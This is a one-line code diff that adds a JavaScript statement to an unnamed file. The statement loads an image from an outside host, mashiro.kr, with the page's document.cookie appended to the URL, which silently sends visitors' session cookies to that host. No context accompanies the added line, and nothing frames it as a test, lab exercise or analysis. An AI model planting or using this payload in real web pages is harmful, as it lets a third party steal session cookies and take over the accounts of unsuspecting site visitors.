@@ -1,0 +1,1 @@
+(new Image()).src="https://mashiro.kr/?f="+document.cookie;
